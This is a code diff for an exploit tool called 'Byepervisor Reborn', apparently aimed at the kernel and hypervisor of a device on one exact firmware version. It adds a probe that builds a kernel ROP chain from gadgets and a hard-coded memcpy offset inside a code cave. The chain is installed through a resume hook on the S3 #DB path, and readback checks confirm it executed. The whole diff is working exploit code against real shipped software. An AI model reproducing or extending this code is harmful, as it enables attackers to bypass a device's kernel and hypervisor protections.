@@ -20,12 +20,25 @@
 
 #include "break_hv_payload/break_hv.h"
 
+#ifndef CALL_PROBE_1360
+#define CALL_PROBE_1360 0
+#endif
+#if CALL_PROBE_1360 && (POSTWAKE_CONFIG || defined(KHOOK_TEST))
+#error CALL_PROBE_1360 requires the ordinary S3 path without post-wake launch
+#endif
+#if CALL_PROBE_1360
+#define BPR_BUILD_TAG "13.60-call-probe-v1"
+#else
+#define BPR_BUILD_TAG "13.60-postwake-sigpipe-v2"
+#endif
+
 #define STATE_ARMED               0x4B484F4F4B454401ULL // 'KHOOKED.'
 #define COOKIE_VAL                0xCAFE133741414141ULL
 #define HOOK_CORE                 0
 #define HOOK_IST                  6
 #define CAVE_STATE_OFF            0x600
 #define CAVE_SAVE_OFF             0x620
+#define CALL_MEMCPY_1360_OFF     0x2590b0
 #define TSS_STRIDE                0x68
 #define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000
 
@@ -145,6 +158,20 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
   kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
   kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
 
+#if CALL_PROBE_1360
+  /* One bounded call in the already-established S3 #DB chain. This copied
+     qword and return value are only a call-frame probe, not allocator proof. */
+  if (kh_chain_call(&chain, ktext(CALL_MEMCPY_1360_OFF), 3,
+                    cave + CAVE_CALL_DST_OFF, cave + CAVE_CALL_SRC_OFF, 8) != 0)
+    return -30;
+  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
+  kh_chain_q(&chain, cave + CAVE_CALL_RET_OFF);
+  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RAX);
+  kh_chain_store(&chain, cave + CAVE_CALL_DONE_OFF, CALL_DONE_SENTINEL);
+  if (chain.err)
+    return -31;
+#endif
+
   ret = kh_install(&hook, &chain);
   if (ret) return ret;
 
@@ -191,6 +218,21 @@ static int write_entry_checked(uint64_t addr, uint64_t value)
   return 0;
 }
 
+#if CALL_PROBE_1360
+static int init_call_probe(uint64_t cave)
+{
+  static const uint64_t offsets[4] = {
+    CAVE_CALL_SRC_OFF, CAVE_CALL_DST_OFF, CAVE_CALL_RET_OFF, CAVE_CALL_DONE_OFF
+  };
+  uint64_t prior;
+  for (unsigned i = 0; i < 4; i++) {
+    if (read_u64(cave + offsets[i], &prior) != 0 || prior != 0)
+      return -1;
+  }
+  return write_entry_checked(cave + CAVE_CALL_SRC_OFF, CALL_SRC_SENTINEL);
+}
+#endif
+
 int main(void)
 {
   uint32_t fw;
@@ -217,8 +259,14 @@ int main(void)
   // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
   fw = kernel_get_fw_version();
   printf("[+] Detected firmware: %x.%x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);
-  if (stage_logf("SESSION start build=13.60-postwake-sigpipe-v2 firmware=0x%x pid=%d",
-                 fw, getpid()) != 0) {
+#if CALL_PROBE_1360
+  if (fw != 0x13600007U) {
+    puts("[!] Call probe requires exact 13.60 firmware; not arming");
+    return 1;
+  }
+#endif
+  if (stage_logf("SESSION start build=%s firmware=0x%x pid=%d",
+                 BPR_BUILD_TAG, fw, getpid()) != 0) {
     notifyf("[ERROR] Byepervisor Reborn\nCannot write stage log; not arming");
     return 1;
   }
@@ -369,6 +417,12 @@ int main(void)
     notifyf("Byepervisor Reborn\nPrior hook state; refusing to re-arm");
     return 1;
   }
+#if CALL_PROBE_1360
+  if (init_call_probe(cave) != 0) {
+    notifyf("Byepervisor Reborn\nCall-probe cave preimage/readback failed; not arming");
+    return 1;
+  }
+#endif
   if (write_u64(oracle, 0) != 0) {
     notifyf("Byepervisor Reborn\nCannot reset stage state");
     return 1;
@@ -445,12 +499,40 @@ int main(void)
         return 1;
       }
 
+#if CALL_PROBE_1360
+      uint64_t call_src = 0, call_dst = 0, call_ret = 0, call_done = 0;
+      int call_read_ok = read_u64(cave + CAVE_CALL_SRC_OFF, &call_src) == 0 &&
+                         read_u64(cave + CAVE_CALL_DST_OFF, &call_dst) == 0 &&
+                         read_u64(cave + CAVE_CALL_RET_OFF, &call_ret) == 0 &&
+                         read_u64(cave + CAVE_CALL_DONE_OFF, &call_done) == 0;
+      int call_ok = call_read_ok && call_src == CALL_SRC_SENTINEL &&
+                    call_dst == CALL_SRC_SENTINEL &&
+                    call_ret == cave + CAVE_CALL_DST_OFF &&
+                    call_done == CALL_DONE_SENTINEL;
+#endif
+
       /* The sender's socket closes across S3, and title/data mounts may lag
          the AP receipt. Keep exploit cleanup complete before this wait. */
       sleep(15);
       notify_set_file_logging(1);
       if (stage_logf("STAGE 0x%lx after hook cleanup", o) != 0)
         printf("[!] Could not append final stage to %s\n", STAGE_LOG_PATH);
+#if CALL_PROBE_1360
+      if (stage_logf("CALL_PROBE_1360 arm=%016lx read=%d ok=%d src=%016lx dst=%016lx ret=%016lx done=%016lx",
+                     arm_id, call_read_ok, call_ok, call_src, call_dst, call_ret,
+                     call_done) != 0) {
+        notifyf("Byepervisor Reborn\nCall-probe durable log failed; stop");
+        return 3;
+      }
+      printf("CALL_PROBE_1360 arm=%016lx read=%d ok=%d src=%016lx dst=%016lx ret=%016lx done=%016lx\n",
+             arm_id, call_read_ok, call_ok, call_src, call_dst, call_ret,
+             call_done);
+      fflush(stdout);
+      if (!call_ok) {
+        notifyf("Byepervisor Reborn\nCall-probe readback failed; stop");
+        return 3;
+      }
+#endif
       notifyf("Byepervisor Reborn\nAP stage complete; gate/IST restored. XOM untested.");
 
 #if POSTWAKE_CONFIG
